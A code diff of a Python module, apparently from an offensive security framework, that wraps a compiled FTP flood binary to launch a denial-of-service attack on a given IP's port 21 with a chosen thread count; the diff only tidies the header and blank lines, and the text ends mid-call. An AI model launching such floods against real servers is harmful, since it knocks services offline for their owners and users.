@@ -1,27 +1,20 @@
+# MIT License.
 # Copyright (c) 2026 Storm Framework
 
-# Licensed under the MIT License.
+# See LICENSE file in the project root for full license information.
 
-See LICENSE file in the project root for full license information.
 
 import subprocess
-
 REQUIRED_OPTIONS = {"IP": "", "THREAD": "example: 1000"}
-
-
 def execute(options):
     target = options.get("IP")
     port = "21"
     threads = options.get("THREAD")
-
     bin_path = "./modules/auxiliary/dos/ftp/src/ftp_flood"
-
     if not target:
         print("[-] Error: TARGET is missing!")
         return
-
     print(f"[*] Preparing DoS to {target}:{port}")
-
     try:
         process = subprocess.Popen(
             [bin_path, "-t", target, "-p", port, "-w", threads],
